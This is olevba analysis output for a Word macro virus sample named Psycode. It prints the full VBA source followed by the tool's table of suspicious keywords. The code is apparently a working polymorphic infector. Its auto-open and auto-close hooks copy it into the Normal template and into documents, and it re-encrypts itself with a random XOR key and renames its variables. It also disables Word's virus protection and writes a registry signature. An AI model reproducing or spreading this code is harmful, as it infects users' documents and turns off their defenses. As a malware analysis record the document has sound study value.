olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psycode-223252e9116d64b15f30f6ad9721b491d2d9e937
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psycode-223252e9116d64b15f30f6ad9721b491d2d9e937 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen(): p2: End Sub
Private Sub Document_Close(): p2: End Sub
Private Sub autoclose(): p2: End Sub
Private Sub document_open(): p2: End Sub
Private Sub p2()
'application.ShowVisualBasicEditor = 0
On Error Resume Next
'Options.VirusProtection = 0: application.EnableCancelKey = 0
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
newcode
z = .ProcStartLine("autoexec", 0)
Set dc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
dc.deletelines 1, dc.countoflines
dc.addfromstring (.Lines(z, z + 13))
.ReplaceLine .ProcStartLine("extra", 0) + 1, "set dc=activedocument"
extra
'NormalTemplate.Save
End With
dc.ReplaceLine dc.ProcStartLine("autoexec", 0), "private a"
With ActiveDocument
'if left(.fullname,2,1)=":" then .SaveAs .FullName
End With
'autoexit
End Sub
Private Sub newcode()
Dim var(1 To 50) As String
Dim newvar(1 To 50) As String
Randomize
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
a = Chr(34)
z = .ProcStartLine("autoexec", 0)
c = (128 + Int(Rnd * 128))
For x = 0 To 3: .ReplaceLine z + x + 1, "tmp = " & a & a: Next x
.ReplaceLine z + 7, "y = y & Chr(Asc(Mid(zzzz, x, 1)) Xor " & c & ")"
s = UCase(.Lines(1, (z + 13)))
'Change the variable names (the name and the length)
';bbbb;jjjj;llll;qqqq;zzzz;
Counter = InStr(s, "'" & Chr(59)): anzvar = 0
For letter = Counter + 2 To Counter + 255 'Line should be longer than 255
If Mid(s, letter, 1) <> Chr(59) Then chiffre = chiffre + Mid(s, letter, 1) Else anzvar = anzvar + 1: var(anzvar) = UCase(chiffre): chiffre = ""
Next letter
'Create new variablenames
For counter1 = 1 To anzvar: For Counter = 1 To Int(Rnd * 3 + 3)
newvar(counter1) = newvar(counter1) + Chr(Int(Rnd() * 25 + 65))
Next Counter: Next counter1
'Change the variablenames
For Counter = 1 To anzvar
letter = InStr(s, var(Counter))
While letter <> 0
s = Left(s, letter - 1) + newvar(Counter) + Mid(s, letter + Len(var(Counter)))
letter = InStr(s, var(Counter))
Wend
Next Counter
.ReplaceLine z + 6, "for x=1 to " & Len(s)
For k = 1 To Len(s)
t = Mid(s, k, 1)
'If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next k
For x = 1 To Len(p): b = b & Chr(Asc(Mid(p, x, 1)) Xor c):
Next x
For x = 0 To 3
.ReplaceLine z + x + 1, var(x + 1) & "=" & a & Mid(b, (1000 * x) + 1, 1000) & a
Next x
End With
End Sub
Private Sub extra()
Set dc = ActiveDocument
Set dcc = dc.VBProject.VBComponents
For x = 2 To dcc.Count: dcc.Remove dcc.Item(2): Next x
With dcc.Item(1).codemodule
z = .ProcStartLine("autoexec", 0)
For x = z + 5 To z + 13
crap = ""
For y = 0 To 20 + Int(Rnd * 30)
crap = crap & Chr(32 + Int(Rnd * 224))
Next y
.ReplaceLine x, .Lines(x, 1) & "'" & crap
Next x
End With
End Sub
Private Sub autoclose()
newcode
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
.ReplaceLine .ProcStartLine("extra", 0) + 1, "set dc=normaltemplate"
extra
.deletelines 1, .ProcStartLine("autoexec", 0) - 1
End With
'NormalTemplate.Save
End Sub
Private Sub toolsoptions()
Options.VirusProtection = 1
Dialogs(974).Show
Options.VirusProtection = 0
End Sub
Private Sub toolsmacro()
End Sub
Sub viewvbcode()
a = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
System.PrivateProfileString("", a, "a") = "psycode v2.e1 june 1999 thanks 2 VirtualLife"
System.PrivateProfileString("", a, "MRUList") = "a"
End Sub
Private Sub autoexec()
BBBB = ""
JJJJ = ""
LLLL = ""
QQQQ = ""
zzzz = BBBB & JJJJ & LLLL & QQQQ: GoTo Label6
For x = 1 To 3364
y = y & Chr(Asc(Mid(zzzz, x, 1)) Xor 169)
Next x
With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
.deletelines 1, .countoflines
.addfromstring y
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
